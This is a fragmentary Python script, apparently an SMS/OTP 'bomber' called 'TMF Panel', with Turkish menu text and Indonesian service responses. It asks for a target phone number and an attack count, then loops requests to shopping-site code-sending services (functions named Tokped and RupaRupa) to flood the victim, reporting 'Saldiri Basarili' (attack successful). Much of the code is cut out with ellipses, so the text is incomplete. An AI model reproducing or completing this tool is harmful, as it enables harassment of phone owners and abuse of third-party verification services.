...
/////**/// /**/**   **/**/**/////
    ...
    //     //         // //
                   ...
                   '''+W+'Creator : KenanTMF  : Panel Baslatiliyor')
        ...
        for x in range(jumlah):
                try:
                        ...
                        if 'tunggu 1x24 jam' in sending_2.text:
                                ...
                                print(''+C+'['+W+'*'+C+']'+W+' TMF - Panel - Basarili '+M+number+W+' Saldiri Tamamlandi !')
...
def Tokped():
        print
        MesinTik(C+'\t TMF - Panel')
        MesinTik(W+'\t================')
        print
        number = raw_input(''+C+'Saldiri Yapacaginiz Numarayi Girin'+W+' ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
        jumlah = input(''+C+'Saldiri Adeti'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
        print
        MesinTik_2(''+C+'-------------- '+W+'TMF Sunar'+C+' --------------')
        print
        for x in range(jumlah):
                try:
...
'tk' : search,
                        ...
                        if 'Anda sudah melakukan 3 kali pengiriman kode' in sending.text:
                                ...
                                print(''+C+'['+W+'*'+C+']'+W+' TMF - PANEL '+C+number+W+' Saldiri Basarili!')
...
def Spam():
        os.system('clear')
        print(M+'KenanTMF'+W+' TMF Panel Baslatiliyor...'+M+'Hazir')
        sleep(1.5)
        os.system('xdg-open https://youtu.be/wd1vXQJ0XVY')
        os.system('clear')
        sleep(1.3)
        Banner()
        print
        print
        print(C+'MENU'+W+' :')
        print(C+'\t['+W+'1'+C+']'+W+' TMF Saldiri'+C+' ( '+H+'Aktif'+C+' )')
        print(C+'\t['+W+'2'+C+']'+W+' TMF Saldiri'+C+' ( '+M+'NonAktif'+C+' )')
        print

        try:

                pilih = input(C+'TMF MENU'+W+' \xE2\x9E\xA4 '+C+'')
                if pilih == 1:
                        Tokped()
                elif pilih == 2:
                        RupaRupa()
